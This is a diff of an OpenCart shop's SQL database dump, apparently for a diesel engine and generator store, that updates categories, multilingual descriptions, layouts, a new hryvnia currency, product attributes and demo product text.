@@ -3,7 +3,7 @@
 -- http://www.phpmyadmin.net
 --
 -- Хост: 127.0.0.1:3306
--- Время создания: Мар 12 2016 г., 20:19
+-- Время создания: Мар 13 2016 г., 04:35
 -- Версия сервера: 5.5.45
 -- Версия PHP: 5.3.29
 
@@ -621,10 +621,10 @@ CREATE TABLE IF NOT EXISTS `oc_category` (
 INSERT INTO `oc_category` (`category_id`, `image`, `parent_id`, `top`, `column`, `sort_order`, `status`, `date_added`, `date_modified`) VALUES
 (66, '', 0, 1, 1, 0, 1, '2016-02-28 18:37:14', '2016-03-02 18:42:32'),
 (67, '', 0, 1, 1, 1, 1, '2016-02-28 18:41:10', '2016-02-28 18:46:49'),
-(72, '', 66, 0, 1, 0, 1, '2016-03-02 14:16:25', '2016-03-02 14:16:25'),
-(69, 'catalog/demo/manufacturer/dell.png', 67, 1, 1, 0, 1, '2016-02-29 15:23:25', '2016-02-29 16:52:25'),
-(70, 'catalog/demo/manufacturer/starbucks.png', 67, 0, 1, 0, 1, '2016-03-02 14:02:57', '2016-03-07 00:03:37'),
-(71, 'catalog/avatars/human2.png', 67, 0, 1, 0, 1, '2016-03-02 14:03:52', '2016-03-02 14:04:21');
+(72, 'catalog/demo/ipod_nano_2.jpg', 66, 0, 1, 0, 1, '2016-03-02 14:16:25', '2016-03-13 01:55:39'),
+(69, 'catalog/demo/manufacturer/dell.png', 67, 1, 1, 0, 1, '2016-02-29 15:23:25', '2016-03-13 02:46:54'),
+(70, 'catalog/demo/manufacturer/starbucks.png', 67, 0, 1, 0, 1, '2016-03-02 14:02:57', '2016-03-13 02:47:10'),
+(71, 'catalog/avatars/human2.png', 67, 0, 1, 0, 1, '2016-03-02 14:03:52', '2016-03-13 02:47:01');
 
 -- --------------------------------------------------------
 
@@ -649,24 +649,24 @@ CREATE TABLE IF NOT EXISTS `oc_category_description` (
 --
 
 INSERT INTO `oc_category_description` (`category_id`, `language_id`, `name`, `description`, `meta_title`, `meta_description`, `meta_keyword`) VALUES
-(69, 4, 'Дизельні двигуни', '&lt;p&gt;Lorem ipsum dolor sit amet, consectetur adipisicing elit. Nisi quod suscipit dolorum praesentium? Quis commodi in, blanditiis. Provident ea soluta amet, asperiores cumque saepe eum, iste iusto, nihil voluptatum quas. Hic voluptas reiciendis omnis assumenda atque quo nihil eos minima quidem consectetur odio, illum obcaecati maiores. Incidunt alias, vero reiciendis?&lt;br&gt;&lt;/p&gt;', 'Дизельні двигуни', '', ''),
 (69, 1, 'Дизельные двигатели', '&lt;p&gt;Lorem ipsum dolor sit amet, consectetur adipisicing elit. Nisi quod suscipit dolorum praesentium? Quis commodi in, blanditiis. Provident ea soluta amet, asperiores cumque saepe eum, iste iusto, nihil voluptatum quas. Hic voluptas reiciendis omnis assumenda atque quo nihil eos minima quidem consectetur odio, illum obcaecati maiores. Incidunt alias, vero reiciendis?&lt;br&gt;&lt;/p&gt;', 'Дизельные двигатели', '', ''),
 (69, 3, 'Diesel engines', '&lt;p&gt;Lorem ipsum dolor sit amet, consectetur adipisicing elit. Nisi quod suscipit dolorum praesentium? Quis commodi in, blanditiis. Provident ea soluta amet, asperiores cumque saepe eum, iste iusto, nihil voluptatum quas. Hic voluptas reiciendis omnis assumenda atque quo nihil eos minima quidem consectetur odio, illum obcaecati maiores. Incidunt alias, vero reiciendis?&lt;br&gt;&lt;/p&gt;', 'Diesel engines', '', ''),
+(69, 4, 'Дизельні двигуни', '&lt;p&gt;Lorem ipsum dolor sit amet, consectetur adipisicing elit. Nisi quod suscipit dolorum praesentium? Quis commodi in, blanditiis. Provident ea soluta amet, asperiores cumque saepe eum, iste iusto, nihil voluptatum quas. Hic voluptas reiciendis omnis assumenda atque quo nihil eos minima quidem consectetur odio, illum obcaecati maiores. Incidunt alias, vero reiciendis?&lt;br&gt;&lt;/p&gt;', 'Дизельні двигуни', '', ''),
+(72, 4, 'Дизель генераторы', '&lt;p&gt;&lt;br&gt;&lt;/p&gt;', 'Дизель генераторы', '', ''),
 (72, 1, 'Дизель генераторы', '&lt;p&gt;&lt;br&gt;&lt;/p&gt;', 'Дизель генераторы', '', ''),
 (72, 3, 'Дизель генераторы', '&lt;p&gt;&lt;br&gt;&lt;/p&gt;', 'Дизель генераторы', '', ''),
-(72, 4, 'Дизель генераторы', '&lt;p&gt;&lt;br&gt;&lt;/p&gt;', 'Дизель генераторы', '', ''),
 (67, 1, 'Комлектующие', '&lt;p&gt;Комлектующие&lt;br&gt;&lt;/p&gt;', 'Комлектующие', 'Комлектующие', 'Комлектующие'),
 (67, 3, 'Accessories', '&lt;p&gt;Accessories&lt;br&gt;&lt;/p&gt;', 'Accessories', 'Accessories', 'Accessories'),
 (67, 4, 'Комплектуючі', '&lt;p&gt;Комплектуючі&lt;br&gt;&lt;/p&gt;', 'Комплектуючі', 'Комплектуючі', 'Комплектуючі'),
 (66, 1, 'Продукция', '&lt;p&gt;Продукция&lt;br&gt;&lt;/p&gt;', 'Продукция', 'Продукция', 'Продукция'),
 (66, 3, 'Products', '&lt;p&gt;Products&lt;br&gt;&lt;/p&gt;', 'Products', 'Products', 'Products'),
 (66, 4, 'Продукція', '&lt;p&gt;Продукція&lt;br&gt;&lt;/p&gt;', 'Продукція', 'Продукція', 'Продукція'),
-(70, 4, 'Синхронные генераторы', '&lt;p&gt;&lt;br&gt;&lt;/p&gt;', 'Синхронные генераторы', '', ''),
+(70, 1, 'Синхронные генераторы', '&lt;p&gt;&lt;br&gt;&lt;/p&gt;', 'Синхронные генераторы', '', ''),
 (70, 3, 'Синхронные генераторы', '&lt;p&gt;&lt;br&gt;&lt;/p&gt;', 'Синхронные генераторы', '', ''),
-(71, 4, 'Прочие комплектующие', '&lt;p&gt;&lt;br&gt;&lt;/p&gt;', 'Прочие комплектующие', '', ''),
-(71, 3, 'Прочие комплектующие', '&lt;p&gt;&lt;br&gt;&lt;/p&gt;', 'Прочие комплектующие', '', ''),
 (71, 1, 'Прочие комплектующие', '&lt;p&gt;&lt;br&gt;&lt;/p&gt;', 'Прочие комплектующие', '', ''),
-(70, 1, 'Синхронные генераторы', '&lt;p&gt;&lt;br&gt;&lt;/p&gt;', 'Синхронные генераторы', '', '');
+(71, 3, 'Прочие комплектующие', '&lt;p&gt;&lt;br&gt;&lt;/p&gt;', 'Прочие комплектующие', '', ''),
+(71, 4, 'Прочие комплектующие', '&lt;p&gt;&lt;br&gt;&lt;/p&gt;', 'Прочие комплектующие', '', ''),
+(70, 4, 'Синхронные генераторы', '&lt;p&gt;&lt;br&gt;&lt;/p&gt;', 'Синхронные генераторы', '', '');
 
 -- --------------------------------------------------------
 
@@ -693,7 +693,12 @@ INSERT INTO `oc_category_filter` (`category_id`, `filter_id`) VALUES
 (70, 6),
 (70, 7),
 (70, 8),
-(70, 9);
+(70, 9),
+(72, 1),
+(72, 2),
+(72, 3),
+(72, 4),
+(72, 5);
 
 -- --------------------------------------------------------
 
@@ -745,9 +750,9 @@ INSERT INTO `oc_category_to_layout` (`category_id`, `store_id`, `layout_id`) VAL
 (67, 0, 0),
 (66, 0, 17),
 (72, 0, 0),
-(69, 0, 0),
-(70, 0, 3),
-(71, 0, 0);
+(69, 0, 24),
+(70, 0, 24),
+(71, 0, 24);
 
 -- --------------------------------------------------------
 
@@ -924,14 +929,15 @@ CREATE TABLE IF NOT EXISTS `oc_currency` (
   `status` tinyint(1) NOT NULL,
   `date_modified` datetime NOT NULL,
   PRIMARY KEY (`currency_id`)
-) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;
+) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=3 ;
 
 --
 -- Дамп данных таблицы `oc_currency`
 --
 
 INSERT INTO `oc_currency` (`currency_id`, `title`, `code`, `symbol_left`, `symbol_right`, `decimal_place`, `value`, `status`, `date_modified`) VALUES
-(1, 'Рубль', 'RUB', '', 'р.', '0', 1.00000000, 1, '2016-03-12 16:01:20');
+(1, 'Рубль', 'RUB', '', 'р.', '0', 1.00000000, 1, '2016-03-12 23:40:58'),
+(2, 'Гривна', 'UAH', '', 'грн.', '', 1.00000000, 1, '2016-03-13 03:22:27');
 
 -- --------------------------------------------------------
 
@@ -1620,7 +1626,7 @@ CREATE TABLE IF NOT EXISTS `oc_layout` (
   `layout_id` int(11) NOT NULL AUTO_INCREMENT,
   `name` varchar(64) NOT NULL,
   PRIMARY KEY (`layout_id`)
-) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=24 ;
+) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=25 ;
 
 --
 -- Дамп данных таблицы `oc_layout`
@@ -1649,7 +1655,8 @@ INSERT INTO `oc_layout` (`layout_id`, `name`) VALUES
 (20, 'Блоги'),
 (21, 'Новости'),
 (22, 'Проекты'),
-(23, 'Услуги');
+(23, 'Услуги'),
+(24, 'Категории_комплектующие');
 
 -- --------------------------------------------------------
 
@@ -1701,7 +1708,7 @@ CREATE TABLE IF NOT EXISTS `oc_layout_route` (
   `store_id` int(11) NOT NULL,
   `route` varchar(255) NOT NULL,
   PRIMARY KEY (`layout_route_id`)
-) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=87 ;
+) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=88 ;
 
 --
 -- Дамп данных таблицы `oc_layout_route`
@@ -1731,7 +1738,8 @@ INSERT INTO `oc_layout_route` (`layout_route_id`, `layout_id`, `store_id`, `rout
 (83, 20, 0, 'custom/blog'),
 (84, 21, 0, 'custom/news'),
 (85, 22, 0, 'custom/projects'),
-(86, 23, 0, 'custom/services');
+(86, 23, 0, 'custom/services'),
+(87, 24, 0, 'product/category1');
 
 -- --------------------------------------------------------
 
@@ -2455,15 +2463,15 @@ INSERT INTO `oc_product` (`product_id`, `model`, `sku`, `upc`, `ean`, `jan`, `is
 (34, 'Product 7', '', '', '', '', '', '', '', 1000, 6, 'catalog/demo/ipod_shuffle_1.jpg', 8, 1, '100.0000', 0, 9, '2009-02-03', '5.00000000', 1, '0.00000000', '0.00000000', '0.00000000', 2, 1, 1, 0, 1, 0, '2009-02-03 18:07:54', '2011-09-30 01:07:17', 0, 0, 0, 0, 0),
 (35, 'Product 8', '', '', '', '', '', '', '', 1000, 5, '', 0, 0, '100.0000', 0, 9, '2009-02-03', '5.00000000', 1, '0.00000000', '0.00000000', '0.00000000', 1, 1, 1, 0, 1, 0, '2009-02-03 18:08:31', '2011-09-30 01:06:17', 0, 0, 0, 0, 0),
 (36, 'Product 9', '', '', '', '', '', '', '', 994, 6, 'catalog/demo/ipod_nano_1.jpg', 8, 0, '100.0000', 100, 9, '2009-02-03', '5.00000000', 1, '0.00000000', '0.00000000', '0.00000000', 2, 1, 1, 0, 1, 0, '2009-02-03 18:09:19', '2011-09-30 01:07:12', 0, 0, 0, 0, 0),
-(40, 'iPhone', '', '', '', '', '', '', '', 970, 5, 'catalog/demo/iphone_1.jpg', 8, 1, '101.0000', 0, 9, '2009-02-03', '10.00000000', 1, '0.00000000', '0.00000000', '0.00000000', 1, 1, 1, 0, 1, 2, '2009-02-03 21:07:12', '2016-03-11 19:41:13', 0, 0, 0, 0, 0),
+(40, 'iPhone', '', '', '', '', '', '', '', 970, 5, 'catalog/demo/iphone_1.jpg', 8, 1, '101.0000', 0, 9, '2009-02-03', '10.00000000', 1, '0.00000000', '0.00000000', '0.00000000', 1, 1, 1, 0, 1, 6, '2009-02-03 21:07:12', '2016-03-13 01:49:59', 0, 0, 0, 0, 0),
 (41, 'Product 14', '', '', '', '', '', '', '', 977, 5, 'catalog/demo/imac_1.jpg', 8, 1, '100.0000', 0, 9, '2009-02-03', '5.00000000', 1, '0.00000000', '0.00000000', '0.00000000', 1, 1, 1, 0, 1, 1, '2009-02-03 21:07:26', '2011-09-30 01:06:44', 0, 0, 0, 0, 0),
 (42, 'Product 15', '', '', '', '', '', '', '', 990, 5, 'catalog/demo/apple_cinema_30.jpg', 8, 1, '100.0000', 400, 9, '2009-02-04', '12.50000000', 1, '1.00000000', '2.00000000', '3.00000000', 1, 1, 2, 0, 1, 32, '2009-02-03 21:07:37', '2016-03-11 03:47:14', 0, 0, 0, 0, 0),
-(43, 'Product 16', '', '', '', '', '', '', '', 929, 5, 'catalog/demo/macbook_1.jpg', 8, 0, '500.0000', 0, 9, '2009-02-03', '10.00000000', 1, '0.00000000', '0.00000000', '0.00000000', 2, 1, 1, 0, 1, 321, '2009-02-03 21:07:49', '2016-03-11 19:41:32', 100, 5, 10, 100, 20),
+(43, 'Product 16', '', '', '', '', '', '', '', 929, 5, 'catalog/demo/macbook_1.jpg', 8, 0, '500.0000', 0, 9, '2009-02-03', '10.00000000', 1, '0.00000000', '0.00000000', '0.00000000', 2, 1, 1, 0, 1, 341, '2009-02-03 21:07:49', '2016-03-11 19:41:32', 100, 5, 10, 100, 20),
 (44, 'Product 17', '', '', '', '', '', '', '', 1000, 5, 'catalog/demo/macbook_air_1.jpg', 8, 1, '1000.0000', 0, 9, '2009-02-03', '0.00000000', 1, '0.00000000', '0.00000000', '0.00000000', 2, 1, 1, 0, 1, 0, '2009-02-03 21:08:00', '2011-09-30 01:05:53', 0, 0, 0, 0, 0),
 (45, 'Product 18', '', '', '', '', '', '', '', 998, 5, 'catalog/demo/macbook_pro_1.jpg', 8, 1, '2000.0000', 0, 100, '2009-02-03', '0.00000000', 1, '0.00000000', '0.00000000', '0.00000000', 2, 1, 1, 0, 1, 0, '2009-02-03 21:08:17', '2011-09-15 22:22:01', 0, 0, 0, 0, 0),
 (46, 'Product 19', '', '', '', '', '', '', '', 1000, 5, 'catalog/demo/sony_vaio_1.jpg', 10, 1, '1000.0000', 0, 9, '2009-02-03', '0.00000000', 1, '0.00000000', '0.00000000', '0.00000000', 2, 1, 1, 0, 1, 0, '2009-02-03 21:08:29', '2011-09-30 01:06:39', 0, 0, 0, 0, 0),
-(47, 'HP LP3065', '', '', '', '', '', '', '', 1000, 5, 'catalog/demo/hp_1.jpg', 7, 1, '100.0000', 400, 9, '2009-02-03', '1.00000000', 1, '0.00000000', '0.00000000', '0.00000000', 1, 0, 1, 0, 1, 0, '2009-02-03 21:08:40', '2016-03-11 19:41:03', 0, 0, 0, 0, 0),
-(48, 'product 20', 'test 1', '', '', '', '', '', 'test 2', 995, 5, 'catalog/demo/ipod_classic_1.jpg', 8, 1, '100.0000', 0, 9, '2009-02-08', '1.00000000', 1, '0.00000000', '0.00000000', '0.00000000', 2, 1, 1, 0, 1, 0, '2009-02-08 17:21:51', '2011-09-30 01:07:06', 0, 0, 0, 0, 0),
+(47, 'HP LP3065', '', '', '', '', '', '', '', 1000, 5, 'catalog/demo/hp_1.jpg', 7, 1, '100.0000', 400, 9, '2009-02-03', '1.00000000', 1, '0.00000000', '0.00000000', '0.00000000', 1, 0, 1, 0, 1, 10, '2009-02-03 21:08:40', '2016-03-13 01:19:34', 0, 0, 0, 0, 0),
+(48, 'product 20', 'test 1', '', '', '', '', '', 'test 2', 995, 5, 'catalog/demo/ipod_classic_1.jpg', 8, 1, '100.0000', 0, 9, '2009-02-08', '1.00000000', 1, '0.00000000', '0.00000000', '0.00000000', 2, 1, 1, 0, 1, 1, '2009-02-08 17:21:51', '2016-03-13 03:27:05', 0, 0, 0, 0, 0),
 (49, 'SAM1', '', '', '', '', '', '', '', 0, 8, 'catalog/demo/samsung_tab_1.jpg', 0, 1, '199.9900', 0, 9, '2011-04-25', '0.00000000', 1, '0.00000000', '0.00000000', '0.00000000', 1, 1, 1, 1, 1, 5, '2011-04-26 08:57:34', '2011-09-30 01:06:23', 0, 0, 0, 0, 0);
 
 -- --------------------------------------------------------
@@ -2542,7 +2550,6 @@ INSERT INTO `oc_product_attribute` (`product_id`, `attribute_id`, `language_id`,
 (43, 12, 1, '30'),
 (47, 20, 3, '600'),
 (47, 20, 4, '600'),
-(40, 13, 3, '400'),
 (40, 13, 4, '400'),
 (40, 15, 1, '300'),
 (40, 15, 3, '300'),
@@ -2551,30 +2558,34 @@ INSERT INTO `oc_product_attribute` (`product_id`, `attribute_id`, `language_id`,
 (40, 16, 3, '250'),
 (40, 16, 4, '250'),
 (40, 20, 1, '50'),
+(40, 20, 3, '50'),
 (47, 15, 4, '450'),
 (47, 15, 3, '450'),
 (47, 15, 1, '450'),
 (47, 13, 4, '400'),
 (47, 13, 3, '400'),
 (47, 13, 1, '400'),
-(47, 12, 4, '350'),
-(47, 12, 3, '350'),
-(47, 12, 1, '350'),
+(40, 13, 3, '400'),
 (40, 13, 1, '400'),
 (40, 12, 4, '500'),
-(40, 12, 3, '500'),
-(40, 12, 1, '500'),
 (47, 21, 1, '70'),
-(47, 21, 3, '70'),
-(47, 21, 4, '70'),
-(40, 20, 3, '50'),
 (40, 20, 4, '50'),
 (40, 21, 1, '200'),
 (40, 21, 3, '200'),
-(40, 21, 4, '200'),
 (43, 21, 1, '200'),
 (43, 21, 3, '200'),
-(43, 21, 4, '200');
+(43, 21, 4, '200'),
+(47, 12, 4, '350'),
+(47, 12, 3, '350'),
+(47, 12, 1, '350'),
+(40, 12, 3, '500'),
+(40, 12, 1, '500'),
+(47, 21, 3, '70'),
+(47, 21, 4, '70'),
+(40, 21, 4, '200'),
+(48, 12, 1, '100'),
+(48, 12, 3, '100'),
+(48, 12, 4, '100');
 
 -- --------------------------------------------------------
 
@@ -2601,7 +2612,7 @@ CREATE TABLE IF NOT EXISTS `oc_product_description` (
 
 INSERT INTO `oc_product_description` (`product_id`, `language_id`, `name`, `description`, `tag`, `meta_title`, `meta_description`, `meta_keyword`) VALUES
 (35, 1, 'Product 8', '&lt;p&gt;\r\n	Product 8&lt;/p&gt;\r\n', '', '', '', ''),
-(48, 1, 'iPod Classic', '&lt;div class=&quot;cpt_product_description &quot;&gt;\n	&lt;div&gt;\n		&lt;p&gt;\n			&lt;strong&gt;More room to move.&lt;/strong&gt;&lt;/p&gt;\n		&lt;p&gt;\n			With 80GB or 160GB of storage and up to 40 hours of battery life, the new iPod classic lets you enjoy up to 40,000 songs or up to 200 hours of video or any combination wherever you go.&lt;/p&gt;\n		&lt;p&gt;\n			&lt;strong&gt;Cover Flow.&lt;/strong&gt;&lt;/p&gt;\n		&lt;p&gt;\n			Browse through your music collection by flipping through album art. Select an album to turn it over and see the track list.&lt;/p&gt;\n		&lt;p&gt;\n			&lt;strong&gt;Enhanced interface.&lt;/strong&gt;&lt;/p&gt;\n		&lt;p&gt;\n			Experience a whole new way to browse and view your music and video.&lt;/p&gt;\n		&lt;p&gt;\n			&lt;strong&gt;Sleeker design.&lt;/strong&gt;&lt;/p&gt;\n		&lt;p&gt;\n			Beautiful, durable, and sleeker than ever, iPod classic now features an anodized aluminum and polished stainless steel enclosure with rounded edges.&lt;/p&gt;\n	&lt;/div&gt;\n&lt;/div&gt;\n&lt;!-- cpt_container_end --&gt;', '', '', '', ''),
+(48, 4, 'iPod Classic', '&lt;div class=&quot;cpt_product_description &quot;&gt;\r\n	&lt;div&gt;\r\n		&lt;p&gt;\r\n			&lt;strong&gt;More room to move.&lt;/strong&gt;&lt;/p&gt;\r\n		&lt;p&gt;\r\n			With 80GB or 160GB of storage and up to 40 hours of battery life, the new iPod classic lets you enjoy up to 40,000 songs or up to 200 hours of video or any combination wherever you go.&lt;/p&gt;\r\n		&lt;p&gt;\r\n			&lt;strong&gt;Cover Flow.&lt;/strong&gt;&lt;/p&gt;\r\n		&lt;p&gt;\r\n			Browse through your music collection by flipping through album art. Select an album to turn it over and see the track list.&lt;/p&gt;\r\n		&lt;p&gt;\r\n			&lt;strong&gt;Enhanced interface.&lt;/strong&gt;&lt;/p&gt;\r\n		&lt;p&gt;\r\n			Experience a whole new way to browse and view your music and video.&lt;/p&gt;\r\n		&lt;p&gt;\r\n			&lt;strong&gt;Sleeker design.&lt;/strong&gt;&lt;/p&gt;\r\n		&lt;p&gt;\r\n			Beautiful, durable, and sleeker than ever, iPod classic now features an anodized aluminum and polished stainless steel enclosure with rounded edges.&lt;/p&gt;\r\n	&lt;/div&gt;\r\n&lt;/div&gt;\r\n&lt;!-- cpt_container_end --&gt;', '', 'iPod Classic', '', ''),
 (40, 3, 'iPhone', '&lt;p class=&quot;intro&quot;&gt;\r\n	iPhone is a revolutionary new mobile phone that allows you to make a call by simply tapping a name or number in your address book, a favorites list, or a call log. It also automatically syncs all your contacts from a PC, Mac, or Internet service. And it lets you select and listen to voicemail messages in whatever order you want just like email.&lt;/p&gt;\r\n', 'Первая линейка', 'iPhone', '', ''),
 (44, 1, 'MacBook Air', '&lt;div&gt;\r\n	MacBook Air is ultrathin, ultraportable, and ultra unlike anything else. But you don&amp;rsquo;t lose inches and pounds overnight. It&amp;rsquo;s the result of rethinking conventions. Of multiple wireless innovations. And of breakthrough design. With MacBook Air, mobile computing suddenly has a new standard.&lt;/div&gt;\r\n', '', '', '', ''),
 (45, 1, 'MacBook Pro', '&lt;div class=&quot;cpt_product_description &quot;&gt;\r\n	&lt;div&gt;\r\n		&lt;p&gt;\r\n			&lt;b&gt;Latest Intel mobile architecture&lt;/b&gt;&lt;/p&gt;\r\n		&lt;p&gt;\r\n			Powered by the most advanced mobile processors from Intel, the new Core 2 Duo MacBook Pro is over 50% faster than the original Core Duo MacBook Pro and now supports up to 4GB of RAM.&lt;/p&gt;\r\n		&lt;p&gt;\r\n			&lt;b&gt;Leading-edge graphics&lt;/b&gt;&lt;/p&gt;\r\n		&lt;p&gt;\r\n			The NVIDIA GeForce 8600M GT delivers exceptional graphics processing power. For the ultimate creative canvas, you can even configure the 17-inch model with a 1920-by-1200 resolution display.&lt;/p&gt;\r\n		&lt;p&gt;\r\n			&lt;b&gt;Designed for life on the road&lt;/b&gt;&lt;/p&gt;\r\n		&lt;p&gt;\r\n			Innovations such as a magnetic power connection and an illuminated keyboard with ambient light sensor put the MacBook Pro in a class by itself.&lt;/p&gt;\r\n		&lt;p&gt;\r\n			&lt;b&gt;Connect. Create. Communicate.&lt;/b&gt;&lt;/p&gt;\r\n		&lt;p&gt;\r\n			Quickly set up a video conference with the built-in iSight camera. Control presentations and media from up to 30 feet away with the included Apple Remote. Connect to high-bandwidth peripherals with FireWire 800 and DVI.&lt;/p&gt;\r\n		&lt;p&gt;\r\n			&lt;b&gt;Next-generation wireless&lt;/b&gt;&lt;/p&gt;\r\n		&lt;p&gt;\r\n			Featuring 802.11n wireless technology, the MacBook Pro delivers up to five times the performance and up to twice the range of previous-generation technologies.&lt;/p&gt;\r\n	&lt;/div&gt;\r\n&lt;/div&gt;\r\n&lt;!-- cpt_container_end --&gt;', '', '', '', ''),
@@ -2630,9 +2641,9 @@ INSERT INTO `oc_product_description` (`product_id`, `language_id`, `name`, `desc
 (46, 4, 'Sony VAIO', '&lt;div&gt;\r\n	Unprecedented power. The next generation of processing technology has arrived. Built into the newest VAIO notebooks lies Intel&amp;#39;s latest, most powerful innovation yet: Intel&amp;reg; Centrino&amp;reg; 2 processor technology. Boasting incredible speed, expanded wireless connectivity, enhanced multimedia support and greater energy efficiency, all the high-performance essentials are seamlessly combined into a single chip.&lt;/div&gt;\r\n', '', '', '', ''),
 (32, 4, 'iPod Touch', '&lt;p&gt;\r\n	&lt;strong&gt;Revolutionary multi-touch interface.&lt;/strong&gt;&lt;br /&gt;\r\n	iPod touch features the same multi-touch screen technology as iPhone. Pinch to zoom in on a photo. Scroll through your songs and videos with a flick. Flip through your library by album artwork with Cover Flow.&lt;/p&gt;\r\n&lt;p&gt;\r\n	&lt;strong&gt;Gorgeous 3.5-inch widescreen display.&lt;/strong&gt;&lt;br /&gt;\r\n	Watch your movies, TV shows, and photos come alive with bright, vivid color on the 320-by-480-pixel display.&lt;/p&gt;\r\n&lt;p&gt;\r\n	&lt;strong&gt;Music downloads straight from iTunes.&lt;/strong&gt;&lt;br /&gt;\r\n	Shop the iTunes Wi-Fi Music Store from anywhere with Wi-Fi.1 Browse or search to find the music youre looking for, preview it, and buy it with just a tap.&lt;/p&gt;\r\n&lt;p&gt;\r\n	&lt;strong&gt;Surf the web with Wi-Fi.&lt;/strong&gt;&lt;br /&gt;\r\n	Browse the web using Safari and watch YouTube videos on the first iPod with Wi-Fi built in&lt;br /&gt;\r\n	&amp;nbsp;&lt;/p&gt;\r\n', '', '', '', ''),
 (35, 4, 'Product 8', '&lt;p&gt;\r\n	Product 8&lt;/p&gt;\r\n', '', '', '', ''),
-(48, 4, 'iPod Classic', '&lt;div class=&quot;cpt_product_description &quot;&gt;\r\n	&lt;div&gt;\r\n		&lt;p&gt;\r\n			&lt;strong&gt;More room to move.&lt;/strong&gt;&lt;/p&gt;\r\n		&lt;p&gt;\r\n			With 80GB or 160GB of storage and up to 40 hours of battery life, the new iPod classic lets you enjoy up to 40,000 songs or up to 200 hours of video or any combination wherever you go.&lt;/p&gt;\r\n		&lt;p&gt;\r\n			&lt;strong&gt;Cover Flow.&lt;/strong&gt;&lt;/p&gt;\r\n		&lt;p&gt;\r\n			Browse through your music collection by flipping through album art. Select an album to turn it over and see the track list.&lt;/p&gt;\r\n		&lt;p&gt;\r\n			&lt;strong&gt;Enhanced interface.&lt;/strong&gt;&lt;/p&gt;\r\n		&lt;p&gt;\r\n			Experience a whole new way to browse and view your music and video.&lt;/p&gt;\r\n		&lt;p&gt;\r\n			&lt;strong&gt;Sleeker design.&lt;/strong&gt;&lt;/p&gt;\r\n		&lt;p&gt;\r\n			Beautiful, durable, and sleeker than ever, iPod classic now features an anodized aluminum and polished stainless steel enclosure with rounded edges.&lt;/p&gt;\r\n	&lt;/div&gt;\r\n&lt;/div&gt;\r\n&lt;!-- cpt_container_end --&gt;', '', '', '', ''),
+(48, 1, 'iPod Classic', '&lt;div class=&quot;cpt_product_description &quot;&gt;\r\n	&lt;div&gt;\r\n		&lt;p&gt;\r\n			&lt;strong&gt;More room to move.&lt;/strong&gt;&lt;/p&gt;\r\n		&lt;p&gt;\r\n			With 80GB or 160GB of storage and up to 40 hours of battery life, the new iPod classic lets you enjoy up to 40,000 songs or up to 200 hours of video or any combination wherever you go.&lt;/p&gt;\r\n		&lt;p&gt;\r\n			&lt;strong&gt;Cover Flow.&lt;/strong&gt;&lt;/p&gt;\r\n		&lt;p&gt;\r\n			Browse through your music collection by flipping through album art. Select an album to turn it over and see the track list.&lt;/p&gt;\r\n		&lt;p&gt;\r\n			&lt;strong&gt;Enhanced interface.&lt;/strong&gt;&lt;/p&gt;\r\n		&lt;p&gt;\r\n			Experience a whole new way to browse and view your music and video.&lt;/p&gt;\r\n		&lt;p&gt;\r\n			&lt;strong&gt;Sleeker design.&lt;/strong&gt;&lt;/p&gt;\r\n		&lt;p&gt;\r\n			Beautiful, durable, and sleeker than ever, iPod classic now features an anodized aluminum and polished stainless steel enclosure with rounded edges.&lt;/p&gt;\r\n	&lt;/div&gt;\r\n&lt;/div&gt;\r\n&lt;!-- cpt_container_end --&gt;', '', 'iPod Classic', '', ''),
 (35, 3, 'Product 8', '&lt;p&gt;\r\n	Product 8&lt;/p&gt;\r\n', '', '', '', ''),
-(48, 3, 'iPod Classic', '&lt;div class=&quot;cpt_product_description &quot;&gt;\r\n	&lt;div&gt;\r\n		&lt;p&gt;\r\n			&lt;strong&gt;More room to move.&lt;/strong&gt;&lt;/p&gt;\r\n		&lt;p&gt;\r\n			With 80GB or 160GB of storage and up to 40 hours of battery life, the new iPod classic lets you enjoy up to 40,000 songs or up to 200 hours of video or any combination wherever you go.&lt;/p&gt;\r\n		&lt;p&gt;\r\n			&lt;strong&gt;Cover Flow.&lt;/strong&gt;&lt;/p&gt;\r\n		&lt;p&gt;\r\n			Browse through your music collection by flipping through album art. Select an album to turn it over and see the track list.&lt;/p&gt;\r\n		&lt;p&gt;\r\n			&lt;strong&gt;Enhanced interface.&lt;/strong&gt;&lt;/p&gt;\r\n		&lt;p&gt;\r\n			Experience a whole new way to browse and view your music and video.&lt;/p&gt;\r\n		&lt;p&gt;\r\n			&lt;strong&gt;Sleeker design.&lt;/strong&gt;&lt;/p&gt;\r\n		&lt;p&gt;\r\n			Beautiful, durable, and sleeker than ever, iPod classic now features an anodized aluminum and polished stainless steel enclosure with rounded edges.&lt;/p&gt;\r\n	&lt;/div&gt;\r\n&lt;/div&gt;\r\n&lt;!-- cpt_container_end --&gt;', '', '', '', ''),
+(48, 3, 'iPod Classic', '&lt;div class=&quot;cpt_product_description &quot;&gt;\r\n	&lt;div&gt;\r\n		&lt;p&gt;\r\n			&lt;strong&gt;More room to move.&lt;/strong&gt;&lt;/p&gt;\r\n		&lt;p&gt;\r\n			With 80GB or 160GB of storage and up to 40 hours of battery life, the new iPod classic lets you enjoy up to 40,000 songs or up to 200 hours of video or any combination wherever you go.&lt;/p&gt;\r\n		&lt;p&gt;\r\n			&lt;strong&gt;Cover Flow.&lt;/strong&gt;&lt;/p&gt;\r\n		&lt;p&gt;\r\n			Browse through your music collection by flipping through album art. Select an album to turn it over and see the track list.&lt;/p&gt;\r\n		&lt;p&gt;\r\n			&lt;strong&gt;Enhanced interface.&lt;/strong&gt;&lt;/p&gt;\r\n		&lt;p&gt;\r\n			Experience a whole new way to browse and view your music and video.&lt;/p&gt;\r\n		&lt;p&gt;\r\n			&lt;strong&gt;Sleeker design.&lt;/strong&gt;&lt;/p&gt;\r\n		&lt;p&gt;\r\n			Beautiful, durable, and sleeker than ever, iPod classic now features an anodized aluminum and polished stainless steel enclosure with rounded edges.&lt;/p&gt;\r\n	&lt;/div&gt;\r\n&lt;/div&gt;\r\n&lt;!-- cpt_container_end --&gt;', '', 'iPod Classic', '', ''),
